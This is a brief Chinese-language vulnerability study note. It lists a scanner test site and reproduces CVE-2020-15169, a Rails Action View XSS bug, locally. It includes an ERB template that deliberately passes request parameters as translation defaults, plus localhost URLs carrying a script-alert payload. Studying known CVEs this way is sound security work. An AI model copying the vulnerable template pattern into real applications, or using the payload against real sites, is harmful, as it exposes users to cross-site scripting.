# 常见漏洞

## 资源
常见漏洞扫描器测试平台
http://demo.aisec.cn/
在线平台,看起来没有收费
http://www.aisec.cn/aiscanner

## rails

[[CVE-2020-15169] Potential XSS vulnerability in Action View](https://groups.google.com/g/rubyonrails-security/c/b-C9kSGXYrc)
> https://sourcegraph.com/github.com/rails/rails/-/compare/v5.2.4.3...v5.2.4.4
> https://sourcegraph.com/github.com/rails/rails@404ad9e8acf8ab45ae2314050131a00e57e63b40/-/blob/actionview/lib/action_view/helpers/translation_helper.rb#L77

rails new rails_vuls --webpack=react
rails g controller hello index

```erb
<h1>Home#index</h1>
<% untrusted_user_controlled_string = params[:a] %>
<%# The welcome_html translation is not defined for the current locale: %>
<%= t("welcome_html", default: untrusted_user_controlled_string) %>
<%= t("welcome_html_safe", default: t(untrusted_user_controlled_string)) %>

<% untrusted_user_controlled_string2 = params[:b] %>
<%# Neither the title.html translation nor the missing.html translation is defined for the current locale: %>
<%= t("title.html", default: [:"missing.html", untrusted_user_controlled_string2]) %>
```
http://localhost:3000/home/index?a=%3Cscript%3Ealert(2)%3C/script%3E
http://localhost:3000/home/index?b=%3Cscript%3Ealert(2)%3C/script%3E
